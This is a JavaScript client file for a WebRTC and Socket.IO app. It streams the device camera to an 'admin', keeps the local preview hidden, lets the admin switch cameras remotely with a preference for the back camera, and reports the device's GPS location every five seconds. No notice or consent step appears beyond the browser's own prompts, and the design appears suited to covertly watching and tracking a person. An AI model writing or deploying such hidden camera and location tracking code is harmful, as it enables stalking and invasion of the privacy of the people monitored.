// USER SIDE — FINAL RELIABLE CAMERA SWITCH
const socket = io();

let pc;
let localStream;
let videoSender; // RTCRtpSender for video
let videoDevices = [];
let currentDeviceIndex = 0;

// Load available cameras
async function loadCameras() {
  const devices = await navigator.mediaDevices.enumerateDevices();
  videoDevices = devices.filter(d => d.kind === "videoinput");
}

// Create PeerConnection ONCE
function createPC() {
  pc = new RTCPeerConnection({
    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
  });

  pc.onicecandidate = e => {
    if (e.candidate) socket.emit("ice-candidate", e.candidate);
  };
}

// Start camera with specific deviceId
async function startCamera(deviceId) {
  // Get stream
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { deviceId: { exact: deviceId } },
    audio: false
  });

  const videoTrack = stream.getVideoTracks()[0];

  // Hidden local preview
  document.getElementById("camera").srcObject = stream;

  // First time: add track
  if (!videoSender) {
    localStream = stream;
    videoSender = pc.addTrack(videoTrack, stream);
  } else {
    // 🔥 THIS IS THE KEY FIX
    await videoSender.replaceTrack(videoTrack);
  }

  // Stop old tracks AFTER replace
  if (localStream) {
    localStream.getTracks().forEach(t => {
      if (t !== videoTrack) t.stop();
    });
  }

  localStream = stream;
}

// Switch camera
async function switchCamera() {
  if (videoDevices.length < 2) return;

  currentDeviceIndex =
    (currentDeviceIndex + 1) % videoDevices.length;

  await startCamera(videoDevices[currentDeviceIndex].deviceId);
}

// Admin triggers switch
socket.on("switch-camera", () => {
  switchCamera();
});

// Receive answer
socket.on("answer", async answer => {
  await pc.setRemoteDescription(new RTCSessionDescription(answer));
});

// ICE from admin
socket.on("ice-candidate", async candidate => {
  try {
    await pc.addIceCandidate(new RTCIceCandidate(candidate));
  } catch {}
});

// Location updates
setInterval(() => {
  navigator.geolocation.getCurrentPosition(pos => {
    socket.emit("location", {
      lat: pos.coords.latitude,
      lon: pos.coords.longitude
    });
  });
}, 5000);

// INIT
(async () => {
  await loadCameras();

  if (videoDevices.length === 0) {
    alert("No camera found");
    return;
  }

  // Prefer back camera
  if (videoDevices.length > 1) {
    currentDeviceIndex = videoDevices.length - 1;
  }

  createPC();

  // Start first camera
  await startCamera(videoDevices[currentDeviceIndex].deviceId);

  // Create offer ONCE
  const offer = await pc.createOffer();
  await pc.setLocalDescription(offer);
  socket.emit("offer", offer);
})();
